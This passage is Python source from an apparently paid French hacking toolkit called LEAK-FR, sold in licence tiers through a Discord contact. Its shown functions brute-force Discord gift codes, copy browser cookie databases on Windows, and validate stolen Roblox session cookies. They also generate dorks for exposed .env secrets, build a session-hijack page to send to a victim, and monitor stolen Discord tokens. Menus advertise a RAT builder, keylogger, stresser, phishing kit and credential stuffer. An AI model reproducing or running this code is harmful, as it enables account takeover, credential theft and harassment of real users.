    h = _dh(t); found = []; start = time.time(); c = 0
    print(f"\n{INF} Sniping {n}s... Ctrl+C pour stop.\n")
    try:
        while time.time() - start < n:
            code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
            c += 1
            try:
                r = requests.get(f"https://discord.com/api/v9/entitlements/gift-codes/{code}", headers=h, timeout=3)
                if r.status_code == 200:
                    url = f"https://discord.gift/{code}"
                    print(f"  {G}[FOUND]{RST} {url}"); found.append(url)
            except: pass
            if c % 20 == 0: print(f"\r  {Y}[~]{RST} {c} try", end=" ")
            time.sleep(0.05)
    except KeyboardInterrupt: pass
    print(f"\n\n{OK} {len(found)} trouves.")
    if found: out("nitro_sniped.txt", "\n".join(found))
    pause()


def vip_session_grab():
    banner_s("BROWSER COOKIE HARVEST")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    lo = os.environ.get("LOCALAPPDATA", ""); ad = os.environ.get("APPDATA", "")
    targets = {
        "Chrome": os.path.join(lo, "Google", "Chrome", "User Data", "Default"),
        "Edge": os.path.join(lo, "Microsoft", "Edge", "User Data", "Default"),
        "Brave": os.path.join(lo, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Opera": os.path.join(ad, "Opera Software", "Opera Stable"),
        "Firefox": os.path.join(ad, "Mozilla", "Firefox", "Profiles"),
    }
    found = []
    for name, path in targets.items():
        if not os.path.isdir(path): continue
        cookie = os.path.join(path, "Cookies")
        if os.path.isfile(cookie):
            try:
                _shutil.copy2(cookie, f"1-Output/cookies_{name.lower()}.db")
                print(f"  {G}[OK]{RST} {name}"); found.append(name)
            except Exception as e: print(f"  {Y}[SKIP]{RST} {name}")
    print(f"\n{OK} {len(found)} navigateurs." if found else f"{INF} Aucun.")
    pause()


def vip_roblox_enrich():
    banner_s("ROBLOX ENRICHER")
    ck = ask(".ROBLOSECURITY:")
    h = {"Cookie": f".ROBLOSECURITY={ck}"}
    r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h, timeout=6)
    if r.status_code != 200: print(f"{ERR} Invalide."); pause(); return
    uid = r.json().get("id"); name = r.json().get("name")
    rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h).json()
    fr = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", headers=h).json()
    prem = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=h, timeout=6).status_code == 200
    print(f"\n  {Y}Username{RST} : {G}{name}{RST}")
    print(f"  {Y}ID{RST}       : {W}{uid}{RST}")
    print(f"  {Y}Robux{RST}    : {G}{rb.get('robux', 0)}{RST}")
    print(f"  {Y}Premium{RST}  : {G if prem else R}{prem}{RST}")
    print(f"  {Y}Friends{RST}  : {W}{fr.get('count', 0)}{RST}")
    pause()


def vip_menu():
    banner_s("VIP PANEL")
    if not _has_tier("vip"):
        print(f"  {R}[X]{RST} Acces reserve aux licences VIP+.")
        print(f"  {DIM}Tier actuel : {W}{_TIER}{RESET_ANSI}")
        print(f"  {DIM}Contacte l'owner pour upgrader ta cle.{RESET_ANSI}")
        pause(); return
    _page_loader(f"Ouverture VIP ({_TIER})")
    while True:
        menu_box(f"*** VIP PANEL [{_TIER.upper()}] ***", [
            ("1", "Mass Token Checker"), ("2", "Account Nuker"),
            ("3", "IP Stresser"), ("4", "Phishing Builder"),
            ("5", "Credential Stuffer"), ("6", "Proxy Scraper"),
            ("7", "Mass Webhook Nuker"), ("8", "Grabber Generator"),
            ("9", "RAT Builder"), ("10", "QR Phishing"),
            ("11", "Mass Token Info"), ("12", "Roblox Cookie Checker"),
            ("13", "Mass IP Scanner"), ("14", "Email Bomber"),
            ("15", "Keylogger Builder"), ("16", "Webhook Info + Test"),
            ("17", "Nitro Sniper"), ("18", "Browser Cookie Harvest"),
            ("19", "Roblox Enricher"),
            ("0", "Retour")])
        c = input(f"  {R}VIP>{RST} ").strip()
        if c == "1": vip_tokens()
        elif c == "2": vip_nuker()
        elif c == "3": vip_stress()
        elif c == "4": vip_phish()
        elif c == "5": vip_stuffer()
        elif c == "6": vip_proxy()
        elif c == "7": vip_wh_nuke()
        elif c == "8": vip_grabber()
        elif c == "9": vip_rat()
        elif c == "10": vip_qr()
        elif c == "11": vip_tinfo()
        elif c == "12": vip_rbx()
        elif c == "13": vip_ipscan()
        elif c == "14": vip_email()
        elif c == "15": vip_keylog()
        elif c == "16": vip_webhook_info()
        elif c == "17": vip_sniper()
        elif c == "18": vip_session_grab()
        elif c == "19": vip_roblox_enrich()
        elif c == "0": break


# ========================================================================
# VIP+ PANEL -- FEATURES EXCLUSIVES
# ========================================================================
def vipx_dork_forge():
    banner_s("AI DORK FORGE")
    print(f"  {DIM}Genere des dorks cibles par categorie. Moteur local offline.{RST}\n")
    cat = ask("[1]WordPress [2]Cameras [3]Printers [4]Backups [5].env/creds [6]Custom:", "1")
    target = ask("Domaine ou laisser vide pour global:", "")

    forge = {
        "1": ["inurl:wp-content/plugins", "inurl:wp-config.php.bak", "inurl:wp-json/wp/v2/users",
              "inurl:/wp-content/uploads/ filetype:sql", "inurl:wp-admin intext:mot de passe",
              'intitle:"Index of" wp-content'],
        "2": ['intitle:"Live View / - AXIS"', "inurl:/view.shtml", 'intitle:"netcam"',
              'intitle:"webcam 7"', 'intitle:"Network Camera"', "inurl:/cgi-bin/mjpg/video.cgi"],
        "3": ["intitle:HPDial", 'intitle:"Web Image Monitor"', "inurl:/printer/main.html",
              'intitle:"Welcome to the CUPS"', "port:9100"],
        "4": ['intitle:"Index of" backup', 'intitle:"Index of" .bak', 'intitle:"Index of" dump.sql',
              'intitle:"Index of" *.sql', "inurl:backup.zip", "inurl:.tar.gz"],
        "5": ["filetype:env DB_PASSWORD", "filetype:env SECRET_KEY", "filetype:env AWS_ACCESS",
              "filetype:env mail_password", "inurl:.env intext:APP_KEY"],
    }
    dorks = list(forge.get(cat, []))
    if cat == "6":
        base = ask("Mot-cle de base:")
        for mod in ["inurl:", "intitle:", "intext:", "filetype:", "ext:", "site:"]:
            dorks.append(f"{mod}{base}")
    if target:
        dorks = [f"site:{target} {d}" for d in dorks]

    print(f"\n{BLOOD_MID}──[ {len(dorks)} DORKS ]──{RESET_ANSI}\n")
    for i, d in enumerate(dorks, 1):
        print(f"  {G}[{i:>2}]{RST} {W}{d}{RST}")
    if ask("\nSauvegarder? (y/n):", "y").lower() == "y":
        out(f"dorks_cat{cat}.txt", "\n".join(dorks))
    if ask("Ouvrir dans Google? (n si tu preferes copier):", "n").lower() == "y":
        import webbrowser
        for d in dorks[:5]:
            webbrowser.open(f"https://google.com/search?q={urllib.parse.quote(d)}")
            time.sleep(0.5)
    pause()


def vipx_friend_graph():
    banner_s("ROBLOX FRIEND GRAPH")
    uid = ask("User ID de depart:")
    depth = ask_int("Profondeur (1-3):", 2)
    max_per = ask_int("Max amis par noeud:", 20)
    seen = set()
    edges = []
    queue = [(uid, 0)]
    print(f"\n{INF} Cartographie en cours...\n")
    while queue:
        cur, lvl = queue.pop(0)
        if cur in seen or lvl > depth: continue
        seen.add(cur)
        try:
            r = requests.get(f"https://friends.roblox.com/v1/users/{cur}/friends?limit={max_per}", timeout=6).json()
            friends = r.get("data", [])
            for f in friends:
                fid = str(f.get("id"))
                name = f.get("name", "?")
                edges.append(f"{cur} -> {fid} ({name})")
                if fid not in seen and lvl + 1 <= depth:
                    queue.append((fid, lvl + 1))
            print(f"  {G}[L{lvl}]{RST} {cur} : {len(friends)} amis")
        except Exception as e:
            print(f"  {R}[ERR]{RST} {cur}: {e}")
        time.sleep(0.6)
    print(f"\n{OK} {len(seen)} comptes, {len(edges)} relations.")
    out(f"friend_graph_{uid}.txt", "\n".join(edges))
    pause()


def vipx_session_link():
    banner_s("SESSION LINK BUILDER")
    print(f"  {DIM}Genere une page HTML qui force la session d'un cookie donne.{RST}")
    print(f"  {DIM}A heberger sur ton serveur, envoyer le lien a la victime.{RST}\n")
    plateforme = ask("[1]Discord [2]Roblox [3]Custom:", "1")
    cookie = ask("Cookie (valeur complete):")
    redir = ask("Redirect apres login (URL):", "https://google.com")

    if plateforme == "1":
        cname = "token"
        target = "https://discord.com/channels/@me"
        setter = f'document.cookie = "token={cookie}; path=/; domain=.discord.com";'
    elif plateforme == "2":
        cname = ".ROBLOSECURITY"
        target = "https://www.roblox.com/home"
        setter = f'document.cookie = ".ROBLOSECURITY={cookie}; path=/; domain=.roblox.com";'
    else:
        cname = ask("Nom cookie:", "session")
        target = ask("URL cible:", "https://google.com")
        setter = f'document.cookie = "{cname}={cookie}; path=/";'

    html = f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Chargement...</title>
<style>body{{background:#111;color:#eee;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
.spinner{{width:50px;height:50px;border:4px solid #333;border-top-color:#e00;border-radius:50%;animation:spin 1s linear infinite}}
@keyframes spin{{to{{transform:rotate(360deg)}}}}</style></head>
<body><div class="spinner"></div>
<script>
    try {{ {setter} }} catch (e) {{ console.log(e); }}
    setTimeout(() => {{ window.location.href = "{redir}"; }}, 800);
</script>
</body></html>'''
    os.makedirs("1-Output", exist_ok=True)
    p = f"1-Output/session_{plateforme}_{int(time.time())}.html"
    open(p, "w", encoding="utf-8").write(html)
    print(f"\n{OK} -> {Y}{p}{RST}")
    print(f"  {DIM}python -m http.server 8080 puis envoie http://ton_ip:8080/<fichier>{RST}")
    print(f"  {DIM}Note : le cookie ne peut PAS etre set par JS sur un domaine que tu ne controles pas.{RST}")
    print(f"  {DIM}Cette page fonctionne SI elle est hebergee sur le domaine cible.{RST}")
    pause()


def vipx_token_monitor():
    banner_s("TOKEN HEALTH MONITOR")
    p = ask("Fichier tokens .txt:")
    if not os.path.isfile(p): print(f"{ERR} Introuvable."); pause(); return
    interval = ask_int("Intervalle check (sec):", 30)
    wh_alert = ask("Webhook alertes (optionnel):", "")
    tokens = [l.strip() for l in open(p, errors="ignore") if l.strip()]
    if not tokens: print(f"{ERR} Vide."); pause(); return

    print(f"\n{INF} Monitoring {len(tokens)} tokens. Ctrl+C pour stop.\n")
    state = {}
    cycle = 0
    try:
        while True:
            cycle += 1
            print(f"\n  {BLOOD_MID}-- Cycle {cycle} [{datetime.now().strftime('%H:%M:%S')}] --{RESET_ANSI}")
            for i, t in enumerate(tokens):
                short = t[:12] + "..."
                try:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t), timeout=5)
                    if r.status_code == 200:
                        d = r.json()
                        user = d.get("username", "?")
                        prev = state.get(t, "unknown")
                        if prev == "dead":
                            print(f"  {G}[REVIVED]{RST} {user}")
                            if wh_alert:
                                requests.post(wh_alert, json={"content": f"Token revivifie: **{user}**\n`{t}`"}, timeout=5)
                        else:
                            print(f"  {G}[ALIVE]{RST} {user}")
                        state[t] = "alive"
                    elif r.status_code == 401:
                        prev = state.get(t, "unknown")
                        if prev != "dead":
                            print(f"  {R}[DEAD]{RST} {short}")
                            if wh_alert:
                                requests.post(wh_alert, json={"content": f"Token mort:\n`{t}`"}, timeout=5)
                        else:
                            print(f"  {DIM}[still dead]{RST} {short}")
                        state[t] = "dead"
                    else:
                        print(f"  {Y}[{r.status_code}]{RST} {short}")
                except Exception as e:
                    print(f"  {Y}[net err]{RST} {short}")
                time.sleep(0.3)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    print(f"\n{OK} Monitoring arrete.")
    pause()


def vipx_email_footprint():
    banner_s("EMAIL FOOTPRINT RECON")
    email = ask("Email cible:").lower()
    if not email: print(f"{ERR} Vide."); pause(); return
    print(f"\n{INF} Check inscriptions sur services connus...\n")
    checks = [
        ("GitHub", f"https://github.com/{email.split('@')[0]}", "text"),
        ("Gravatar", f"https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}?d=404", "status"),
        ("HIBP", f"https://haveibeenpwned.com/account/{email}", "text"),
        ("Pinterest", f"https://pinterest.com/{email.split('@')[0]}", "text"),
        ("Spotify", f"https://open.spotify.com/user/{email.split('@')[0]}", "text"),
        ("Twitter/X", f"https://nitter.privacydev.net/{email.split('@')[0]}", "text"),
        ("Reddit", f"https://reddit.com/user/{email.split('@')[0]}", "text"),
    ]
    for name, url, mode in checks:
        try:
            r = requests.get(url, timeout=6, headers={"User-Agent": "Mozilla/5.0"})
            found = r.status_code == 200 and "not found" not in r.text.lower()[:1000]
            print(f"  {G if found else DIM}[{'FOUND' if found else '---'}]{RST} {name:<14} {url[:70]}")
        except:
            print(f"  {DIM}[ERR]{RST} {name}")
    print(f"\n  {Y}Gravatar direct{RST} : https://gravatar.com/avatar/{hashlib.md5(email.encode()).hexdigest()}")
    print(f"  {Y}Dehashed{RST}       : https://dehashed.com/search?query={email}")
    print(f"  {Y}HIBP{RST}           : https://haveibeenpwned.com/account/{email}")
    pause()


def vipx_menu():
    banner_s("VIP+ PANEL")
    if not _has_tier("vip+"):
        print(f"  {R}[X]{RST} Acces reserve aux licences VIP+.")
        print(f"  {DIM}Tier actuel : {W}{_TIER}{RESET_ANSI}")
        pause(); return
    _page_loader(f"Ouverture VIP+ ({_TIER})")
    while True:
        menu_box(f"*** VIP+ PANEL [{_TIER.upper()}] ***", [
            ("1", "AI Dork Forge"),
            ("2", "Roblox Friend Graph"),
            ("3", "Session Link Builder"),
            ("4", "Token Health Monitor"),
            ("5", "Email Footprint Recon"),
            ("0", "Retour")], color=PLUS_COL)
        c = input(f"  {PLUS_COL}VIP+>{RST} ").strip()
        if c == "1": vipx_dork_forge()
        elif c == "2": vipx_friend_graph()
        elif c == "3": vipx_session_link()
        elif c == "4": vipx_token_monitor()
        elif c == "5": vipx_email_footprint()
        elif c == "0": break


# ========================================================================
# AMI PANEL -- FEATURES PERSONNELLES
# ========================================================================
_AMI_DIR = "1-Output/.ami"
_BRAND_FILE = os.path.join(_AMI_DIR, ".brand")
_VAULT_FILE = os.path.join(_AMI_DIR, ".vault")
_PRESETS_FILE = os.path.join(_AMI_DIR, ".presets")


def _load_brand():
    try: return open(_BRAND_FILE).read().strip()
    except Exception: return ""


def ami_brand():
    banner_s("CUSTOM BRANDING")
    print(f"  {DIM}Pseudo affiche en haut du banner sur chaque page.{RST}\n")
    cur = _load_brand()
    if cur: print(f"  {Y}Pseudo actuel{RST} : {G}{cur}{RST}\n")
    new = ask("Nouveau pseudo (vide pour effacer):")
    os.makedirs(_AMI_DIR, exist_ok=True)
    open(_BRAND_FILE, "w").write(new)
    global _BRAND
    _BRAND = new
    print(f"\n{OK} Branding mis a jour.")
    pause()


def _vault_key(pw):
    return hashlib.sha256(("vault_salt_31300_" + pw).encode()).digest()


def _xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def ami_vault():
    banner_s("PERSONAL VAULT")
    print(f"  {DIM}Notes/creds chiffrees localement (XOR-SHA256).{RST}\n")
    pw = ask("Mot de passe vault:")
    if not pw: print(f"{ERR} Vide."); pause(); return
    k = _vault_key(pw)
    os.makedirs(_AMI_DIR, exist_ok=True)

    if os.path.isfile(_VAULT_FILE):
        try:
            blob = open(_VAULT_FILE, "rb").read()
            plain = _xor(blob, k)
            # test integrite : si dechiffre mais garbage, on continue quand meme
            try: data = json.loads(plain.decode())
            except: data = {"notes": [], "creds": []}
        except:
            data = {"notes": [], "creds": []}
    else:
        data = {"notes": [], "creds": []}

    while True:
        print(f"\n  {Y}[1]{RST}Ajouter note  {Y}[2]{RST}Ajouter cred  {Y}[3]{RST}Lister  {Y}[4]{RST}Sauver+Quitter")
        c = ask("Action:", "3")
        if c == "1":
            title = ask("Titre:"); body = ask("Contenu:")
            data["notes"].append({"t": title, "b": body, "at": datetime.now().isoformat()})
            print(f"{OK} Note ajoutee.")
        elif c == "2":
            site = ask("Site:"); user = ask("User:"); pw_ = ask("Pass:")
            data["creds"].append({"site": site, "user": user, "pass": pw_})
            print(f"{OK} Cred ajoute.")
        elif c == "3":
            print(f"\n{BLOOD_MID}-- NOTES --{RESET_ANSI}")
            for n in data["notes"]:
                print(f"  {Y}{n['t']}{RST} : {DIM}{n['b'][:80]}{RST}")
            print(f"\n{BLOOD_MID}-- CREDS --{RESET_ANSI}")
            for cr in data["creds"]:
                print(f"  {G}{cr['site']}{RST} | {cr['user']} | {cr['pass']}")
        elif c == "4":
            blob = _xor(json.dumps(data).encode(), k)
            open(_VAULT_FILE, "wb").write(blob)
            print(f"\n{OK} Vault sauve ({len(blob)} octets).")
            break
    pause()


def ami_relay():
    banner_s("PRIORITY RELAY")
    print(f"  {DIM}Envoie un message direct a l'owner (Discord).{RST}\n")
    wh = ask("Webhook owner:", "")
    if not wh:
        wh = _load_ami_relay()
        if not wh:
            print(f"{ERR} Aucun webhook configure."); pause(); return
        print(f"  {DIM}Utilise : {wh[:60]}...{RST}")
    else:
        _save_ami_relay(wh)
    msg = ask("Message a envoyer:")
    if not msg: print(f"{ERR} Vide."); pause(); return
    try:
        r = requests.post(wh, json={"embeds": [{
            "title": f"[RELAY] {_BRAND or 'AMI'}",
            "color": 0xFF00AA,
            "description": msg,
            "fields": [{"name": "HWID", "value": _hwid()[:16], "inline": True},
                       {"name": "Tier", "value": _TIER, "inline": True}],
            "timestamp": datetime.utcnow().isoformat() + "Z"}]}, timeout=8)
        print(f"{OK if r.status_code in [200, 204] else ERR} {r.status_code}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def _save_ami_relay(wh):
    os.makedirs(_AMI_DIR, exist_ok=True)
    open(os.path.join(_AMI_DIR, ".relay"), "w").write(wh)


def _load_ami_relay():
    try: return open(os.path.join(_AMI_DIR, ".relay")).read().strip()
    except Exception: return ""


def ami_presets():
    banner_s("TOOL PRESETS")
    print(f"  {DIM}Sauvegarde et reutilise des configs d'outils.{RST}\n")
    os.makedirs(_AMI_DIR, exist_ok=True)
    if os.path.isfile(_PRESETS_FILE):
        try: presets = json.load(open(_PRESETS_FILE))
        except: presets = {}
    else:
        presets = {}

    print(f"  {Y}[1]{RST}Voir  {Y}[2]{RST}Ajouter  {Y}[3]{RST}Supprimer  {Y}[0]{RST}Retour")
    c = ask("Action:", "1")
    if c == "1":
        if not presets:
            print(f"  {DIM}Vide.{RST}")
        else:
            for name, data in presets.items():
                print(f"\n  {G}{name}{RST}")
                for k, v in data.items():
                    print(f"    {Y}{k}{RST} = {W}{v}{RST}")
    elif c == "2":
        name = ask("Nom preset:")
        print(f"  {DIM}Champs: target, port, webhook, lhost, lport...{RST}")
        fields = {}
        while True:
            k = ask("Champ (vide pour finir):")
            if not k: break
            v = ask(f"  {k} =")
            fields[k] = v
        if name and fields:
            presets[name] = fields
            json.dump(presets, open(_PRESETS_FILE, "w"), indent=2)
            print(f"{OK} Preset '{name}' sauve.")
    elif c == "3":
        for name in presets: print(f"  {Y}-{RST} {name}")
        rm = ask("Nom a supprimer:")
        if rm in presets:
            del presets[rm]
            json.dump(presets, open(_PRESETS_FILE, "w"), indent=2)
            print(f"{OK} Supprime.")
    pause()


def ami_menu():
    banner_s("AMI PANEL -- ACCES PRIVE")
    if not _has_tier("ami"):
        print(f"  {R}[X]{RST} Acces reserve aux licences AMI.")
        print(f"  {DIM}Tier actuel : {W}{_TIER}{RESET_ANSI}")
        pause(); return
    _page_loader(f"Ouverture AMI ({_BRAND or 'anonyme'})")
    while True:
        menu_box(f"*** AMI PANEL ***", [
            ("1", "Custom Branding"),
            ("2", "Personal Vault"),
            ("3", "Priority Relay (owner)"),
            ("4", "Tool Presets"),
            ("0", "Retour")], color=AMI_COL)
        c = input(f"  {AMI_COL}AMI>{RST} ").strip()
        if c == "1": ami_brand()
        elif c == "2": ami_vault()
        elif c == "3": ami_relay()
        elif c == "4": ami_presets()
        elif c == "0": break


# ========================================================================
# LICENSE / ACTIVATION (remote, tiers)
# ========================================================================
_PRESET_KEY  = ""                                    # colle ta cle ici pour auto-activation
_OWNER_PW    = "moumou-leakfr"
_OWNER_TRIG  = "1337"
_LIC_DIR     = "1-Output"
_LIC_FILE    = os.path.join(_LIC_DIR, ".leakfr_license")
_LIC_SERVER  = "https://TON-URL.trycloudflare.com"   # <-- A CHANGER
_LIC_GRACE   = 7 * 86400
_OWNER_TRIES = {"n": 0}


def _hwid():
    if platform.system() == "Windows":
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
            g, _ = winreg.QueryValueEx(k, "MachineGuid")
            winreg.CloseKey(k)
            return hashlib.sha256(g.encode()).hexdigest()[:32]
        except Exception: pass
    import uuid as _u
    return hashlib.sha256(str(_u.getnode()).encode()).hexdigest()[:32]


def _save_lic(data):
    os.makedirs(_LIC_DIR, exist_ok=True)
    data["cached_at"] = int(time.time())
    with open(_LIC_FILE, "w", encoding="utf-8") as f: json.dump(data, f)


def _load_lic():
    if not os.path.isfile(_LIC_FILE): return None
    try: return json.load(open(_LIC_FILE, encoding="utf-8"))
    except Exception: return None


def _remote_validate(key, hwid):
    try:
        r = requests.post(f"{_LIC_SERVER}/validate", json={"key": key, "hwid": hwid}, timeout=8)
        return r.json()
    except Exception as e:
        return {"ok": False, "msg": f"offline: {e}"}


def _remote_admin(path, payload=None, method="POST"):
    try:
        url = f"{_LIC_SERVER}{path}"
        h = {"X-Admin": _OWNER_PW}
        if method == "POST":
            r = requests.post(url, headers=h, json=payload or {}, timeout=8)
        else:
            r = requests.get(url, headers=h, timeout=8)
        return r.json()
    except Exception as e:
        return {"ok": False, "msg": f"serveur injoignable: {e}"}


def _is_activated():
    global _TIER, _BRAND
    lic = _load_lic()
    if not lic: return False, "aucune licence"
    hwid = _hwid()
    if lic.get("hwid") != hwid: return False, "mauvaise machine"

    r = _remote_validate(lic["key"], hwid)
    if r.get("ok"):
        lic["exp"] = r["exp"]; lic["tier"] = r.get("tier", "free"); lic["sig"] = r["sig"]
        _save_lic(lic)
        _TIER = lic["tier"]
        _BRAND = _load_brand()
        if lic["exp"] != 0 and lic["exp"] < int(time.time()):
            return False, "cle expiree"
        return True, "ok"

    if "offline" in r.get("msg", ""):
        age = int(time.time()) - lic.get("cached_at", 0)
        if age > _LIC_GRACE: return False, "cache expire"
        _TIER = lic.get("tier", "free")
        _BRAND = _load_brand()
        if lic.get("exp", 0) != 0 and lic["exp"] < int(time.time()):
            return False, "cle expiree (cache)"
        return True, f"offline ({_LIC_GRACE - age}s)"
    return False, r.get("msg", "refus serveur")


def _activate(key):
    hwid = _hwid()
    r = _remote_validate(key, hwid)
    if not r.get("ok"): return False, r.get("msg", "refus")
    _save_lic({"key": key, "exp": r["exp"], "tier": r.get("tier", "free"),
               "sig": r["sig"], "hwid": hwid})
    return True, "activated"


def _fmt_exp(exp):
    if exp == 0: return "LIFETIME"
    return datetime.fromtimestamp(exp).strftime("%Y-%m-%d %H:%M")


def activation_screen():
    clr()
    leakfr_banner()
    bar = "═" * 60
    print(f"  {BLOOD_MID}{bar}{RESET_ANSI}")
    print(f"  {BLOOD_MID}║{RESET_ANSI} "
          f"{BOLD_ANSI}{BLOOD_BRIGHT}{'A C T I V A T I O N':^60}{RESET_ANSI} "
          f"{BLOOD_MID}║{RESET_ANSI}")
    print(f"  {BLOOD_MID}{bar}{RESET_ANSI}\n")

    if _PRESET_KEY and not os.path.isfile(_LIC_FILE):
        print(f"  {DIM}Auto-activation avec cle preset...{RESET_ANSI}")
        _page_loader("Activation licence preset")
        key = _PRESET_KEY
    else:
        print(f"  {Y}[!]{RST} Aucune licence valide detectee sur cette machine.")
        print(f"  {DIM}HWID    : {_hwid()[:16]}...{RESET_ANSI}")
        print(f"  {DIM}Serveur : {_LIC_SERVER}{RESET_ANSI}")
        print(f"  {DIM}Tiers   : free · vip · vip+ · ami · owner{RESET_ANSI}")
        print(f"  {DIM}Format  : LEAKFR-XXXX-XXXX-XXXX-XXXX{RESET_ANSI}\n")
        key = input(f"  {BLOOD_BRIGHT}cle >{RESET_ANSI} ").strip()

    if key == _OWNER_TRIG:
        owner_menu()
        return activation_screen()

    ok, msg = _activate(key)
    if ok:
        _page_loader("Verification de la licence")
        print(f"  {G}[OK]{RST} Licence activee -- bienvenue.")
        time.sleep(1.0); return
    print(f"  {R}[X]{RST} {msg}")
    time.sleep(1.6); sys.exit(1)


# ========================================================================
# OWNER PANEL
# ========================================================================
def owner_menu():
    banner_s("OWNER PANEL -- ACCES RESTREINT")
    if _OWNER_TRIES["n"] >= 3:
        print(f"  {R}[LOCKED]{RST} Trop de tentatives."); pause(); return
    pw = input(f"  {BLOOD_BRIGHT}master >{RESET_ANSI} ").strip()
    if pw != _OWNER_PW:
        _OWNER_TRIES["n"] += 1
        print(f"  {R}[X]{RST} Mot de passe incorrect."); time.sleep(1.2); return
    _OWNER_TRIES["n"] = 0
    _page_loader("Authentification owner")

    while True:
        menu_box("OWNER PANEL", [
            ("1", "Generer une cle"), ("2", "Lister les cles"),
            ("3", "Revoquer une cle"), ("4", "Etendre une cle"),
            ("5", "Changer le tier"), ("6", "Unbind (transfert)"),
            ("7", "Statut licence locale"), ("8", "Desactiver cette machine"),
            ("0", "Retour")])
        c = input(f"  {R}owner>{RST} ").strip()

        if c == "1":
            dur = ask("Duree (1d 7d 30d 90d 1y life):", "30d")
            exp = _dur_to_exp(dur)
            if exp is None: print(f"  {R}[X]{RST} invalide."); pause(); continue
            tier = ask("Tier (free/vip/vip+/ami/owner):", "vip").lower()
            if tier not in ("free", "vip", "vip+", "ami", "owner"):
                print(f"  {R}[X]{RST} tier invalide."); pause(); continue
            r = _remote_admin("/admin/gen", {"exp": exp, "tier": tier})
            if r.get("ok"):
                print(f"\n  {G}[NEW KEY]{RST} {BOLD_ANSI}{BLOOD_LIGHT}{r['key']}{RESET_ANSI}")
                print(f"  {Y}Expire{RST} : {_fmt_exp(exp)}   {Y}Tier{RST} : {tier}")
            else:
                print(f"  {R}[X]{RST} {r.get('msg')}")
            pause()

        elif c == "2":
            r = _remote_admin("/admin/list", method="GET")
            if not isinstance(r, dict) or r.get("ok") is False:
                print(f"  {R}[X]{RST} {r.get('msg') if isinstance(r, dict) else r}"); pause(); continue
            if not r: print(f"  {DIM}Aucune cle.{RST}")
            else:
                for k, v in r.items():
                    bind = (v["hwid"][:8] + "...") if v.get("hwid") else "free"
                    print(f"  {Y}{k}{RESET_ANSI}  tier={v.get('tier','free')}  "
                          f"exp={_fmt_exp(v.get('exp', 0))}  hwid={bind}")
            pause()

        elif c == "3":
            key = ask("Cle a revoquer:")
            r = _remote_admin("/admin/revoke", {"key": key})
            print(f"  {G}[OK]{RST}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}"); pause()

        elif c == "4":
            key = ask("Cle:")
            dur = ask("Nouvelle duree depuis maintenant:", "30d")
            exp = _dur_to_exp(dur)
            if exp is None: print(f"  {R}[X]{RST} invalide."); pause(); continue
            r = _remote_admin("/admin/extend", {"key": key, "exp": exp})
            print(f"  {G}[OK]{RST} -> {_fmt_exp(exp)}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            pause()

        elif c == "5":
            key = ask("Cle:")
            tier = ask("Nouveau tier (free/vip/vip+/ami/owner):", "vip").lower()
            if tier not in ("free", "vip", "vip+", "ami", "owner"):
                print(f"  {R}[X]{RST} invalide."); pause(); continue
            r = _remote_admin("/admin/tier", {"key": key, "tier": tier})
            print(f"  {G}[OK]{RST} -> tier={tier}" if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            pause()

        elif c == "6":
            key = ask("Cle a unbind:")
            r = _remote_admin("/admin/unbind", {"key": key})
            print(f"  {G}[OK]{RST} unbind." if r.get("ok") else f"  {R}[X]{RST} {r.get('msg')}")
            pause()

        elif c == "7":
            ok, msg = _is_activated()
            if ok:
                lic = _load_lic()
                print(f"  {G}[ACTIVE]{RST} cle  : {W}{lic['key']}{RESET_ANSI}")
                print(f"  {Y}Tier {RST}: {lic.get('tier','free')}")
                print(f"  {Y}Exp  {RST}: {_fmt_exp(lic.get('exp', 0))}")
                print(f"  {Y}HWID {RST}: {lic['hwid'][:16]}...")
            else:
                print(f"  {R}[INACTIVE]{RST} {msg}")
            pause()

        elif c == "8":
            if ask("Confirmer? (y/n):", "n").lower() == "y":
                try: os.remove(_LIC_FILE); print(f"  {G}[OK]{RST} licence locale retiree.")
                except Exception as e: print(f"  {R}[FAIL]{RST} {e}")
            pause()

        elif c == "0": break


def _dur_to_exp(dur):
    dur = dur.strip().lower()
    if dur in ("life", "lifetime", "0"): return 0
    mult = {"d": 86400, "w": 604800, "m": 2592000, "y": 31536000}
    try:
        n = int(dur[:-1]); u = dur[-1]
        if u not in mult: return None
        return int(time.time()) + n * mult[u]
    except Exception:
        return None


# ========================================================================
# INFO & CONTACT
# ========================================================================
def info_contact_screen():
    banner_s("INFO & CONTACT")
    print(f"""
  {BLOOD_MID}──[ {BOLD_ANSI}{BLOOD_BRIGHT}LEAK-FR v{VERSION}{RESET_ANSI}{BLOOD_MID} ]──{RESET_ANSI}

  {Y}Tier actuel{RST}    : {W}{_TIER}{RST}
  {Y}Branding{RST}       : {W}{_BRAND or '-'}{RST}
  {Y}HWID{RST}           : {DIM}{_hwid()[:16]}...{RST}
  {Y}Serveur{RST}        : {DIM}{_LIC_SERVER}{RST}

  {BLOOD_MID}──[ {BOLD_ANSI}{BLOOD_LIGHT}OBTENIR UNE CLE{RESET_ANSI}{BLOOD_MID} ]──{RESET_ANSI}

  {G}Discord{RST}        : {BOLD_ANSI}{BLOOD_BRIGHT}moumou0718{RESET_ANSI}
  {G}Contact{RST}        : ouvre un DM, envoie ton HWID + ton besoin

  {BLOOD_MID}──[ {BOLD_ANSI}{BLOOD_LIGHT}FORMULES{RESET_ANSI}{BLOOD_MID} ]──{RESET_ANSI}

  {Y}VIP 30j{RST}        : {W}panel VIP complet{RST}
